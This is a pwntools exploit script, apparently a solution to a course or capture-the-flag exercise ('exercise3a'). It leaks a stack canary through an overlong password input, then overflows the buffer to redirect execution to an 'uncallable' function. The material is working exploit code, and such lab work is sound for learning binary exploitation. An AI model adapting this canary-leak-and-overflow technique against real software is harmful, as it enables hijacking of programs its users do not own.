#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise3a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x401443
b *0x4012e3
b *0x4012eb
b *0x401306
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
uncallable = 0x0000000000401256
canary_leak = b'A'*155
r = start()
r.recvuntil(b'password:\n')
r.sendline(canary_leak)
canary_out = r.recvuntil(b' is not the password\n')
canary = canary_out[171: len(canary_out) - 21]
print(canary)
print(len(canary))

shellcode = b'A'*156 + canary + b'B'*24 + p64(uncallable) + p64(0x00000000)
r.recvuntil(b'password:\n')
r.sendline(shellcode)
print(r.recvall().decode(errors='ignore'))

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

